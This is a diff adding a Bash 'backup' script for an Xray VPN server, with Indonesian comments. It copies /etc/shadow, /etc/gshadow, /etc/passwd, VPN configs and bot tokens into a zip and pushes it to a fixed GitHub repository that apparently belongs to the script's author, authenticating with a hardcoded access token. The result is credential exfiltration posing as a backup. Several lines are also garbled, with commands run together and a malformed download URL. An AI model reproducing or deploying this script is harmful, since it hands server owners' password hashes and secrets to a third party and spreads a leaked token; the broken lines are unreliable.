@@ -1,0 +1,101 @@
+#!/bin/bash
+
+# Konfigurasi warna output
+green="\e[32m"
+NC="\e[0m"  # Reset warna
+
+# Konfigurasi direktori backup dan nama file
+BACKUP_ROOT="/root/backup"
+BACKUP_NAME="backup$(date +%H:%M:%S).zip"
+BACKUP_PATH="/tmp/$BACKUP_NAME"
+
+# Tanggal
+Tanggal="$(date +%Y-%m-%d)"
+JAM="$(date +%H:%M:%S)"
+DOMAIN="$(cat /etc/xray/domain)"
+
+# konfigurasi Telegram
+TELEGRAM_TOKEN="$(cat /etc/lunatic/bot/notif/key)"
+TELEGRAM_CHAT_ID="$(cat /etc/lunatic/bot/notif/id)"
+
+# Konfigurasi GitHub
+GITHUB_USERNAME="momoklumer"
+GITHUB_TOKEN="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"
+GITHUB_REPO="autobackup"
+
+# send notif
+send_telegram_message() {
+    local message=$1
+    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+        -d chat_id="$TELEGRAM_CHAT_ID" \
+        -d parse_mode="Markdown" \
+        -d text="$message" >/dev/null
+}
+
+# Langkah 1: Membuat folder backup dan mencadangkan file
+mkdir -p "$BACKUP_ROOT" &>/dev/null
+echo -e "[ ${green}INFO${NC} ] • Memulai proses backup..."
+
+# Mencadangkan file dan direktori penting
+cp /etc/passwd "$BACKUP_ROOT" &>/dev/null
+cp /etc/group "$BACKUP_ROOT" &>/dev/null
+cp /etc/shadow "$BACKUP_ROOT" &>/dev/null
+cp /etc/gshadow "$BACKUP_ROOT" &>/dev/null
+cp -r /etc/lunatic "$BACKUP_ROOT/lunatic" &>/dev/null
+cp -r /var/lib/LT "$BACKUP_ROOT/LT" &>/dev/null
+cp -r /etc/xray "$BACKUP_ROOT/xray" &>/dev/null
+cp -r /var/www/html "$BACKUP_ROOT/html" &>/dev/null
+
+
+cp -r /etc/bot "$BACKUP_ROOT/bot" &>/dev/nullcp -r /var "$BACKUP_ROOT/html" &>/dev/nullecho -e "[ ${green}INFO${NC} ] • Semua file dan folder berhasil dicadangkan di $BACKUP_ROOT."
+
+# Langkah 2: Membuat arsip ZIP dari folder backup
+echo "Mengarsipkan folder backup menjadi $BACKUP_PATH..."
+zip -r "$BACKUP_PATH" "$BACKUP_ROOT" &>/dev/null
+echo "Backup arsip disimpan di $BACKUP_PATH"
+
+# Langkah 3: Mengunggah arsip ke GitHub
+echo "Mengunggah backup ke GitHub..."
+
+# Membuat commit baru dan mendorong file backup ke repositori GitHub
+git clone https://github.com/$GITHUB_USERNAME/$GITHUB_REPO.git /tmp/repo
+cd /tmp/repo
+
+# Menyalin file backup ke repositori
+cp "$BACKUP_PATH" .
+
+# Menambahkan file ke staging area dan commit perubahan
+git add "$BACKUP_NAME"
+git commit -m "Backup pada $(date)"
+git push https://$GITHUB_USERNAME:$GITHUB_TOKEN@github.com/$GITHUB_USERNAME/$GITHUB_REPO.git main
+
+# Menyusun link unduhan
+DOWNLOAD_LINK="https://githubusercontent.com/$GITHUB_USERNAME/$GITHUB_REPO/raw/main/$BACKUP_NAME"
+clear
+echo -e "\e[97;1m     ==============[ BACKUP DATA ]=============\e[0m"
+echo -e ""
+echo -e "[${green}INFO${NC}] • \e[96mDomain Host:\e[0m $DOMAIN"
+echo -e "[${green}INFO${NC}] • \e[96mDate Backup:\e[0m $Tanggal"
+echo -e "[${green}INFO${NC}] • \e[96mJam  Backup:\e[0m $JAM"
+echo -e "[${green}INFO${NC}] • \e[96mLink Backup:\e[0m "
+echo -e "$DOWNLOAD_LINK"
+echo -e ""
+echo -e "\e[97;1m     ============[ LUNATIC SCRIPTS ]===========\e[0m"
+echo -e ""
+
+# Kirim notifikasi ke Telegram
+send_telegram_message "
+*======================*
+   * ✅ Backup berhasil ✅ * 
+*======================*
+* DOMAIN: $DOMAIN *
+* TANGGAL :  $Tanggal *
+* JAM : $JAM *
+*======================*
+* LINK BACKUP:*
+$DOWNLOAD_LINK"
+
+rm "$BACKUP_PATH"
+rm -rf "$BACKUP_ROOT"
+
+exec bash
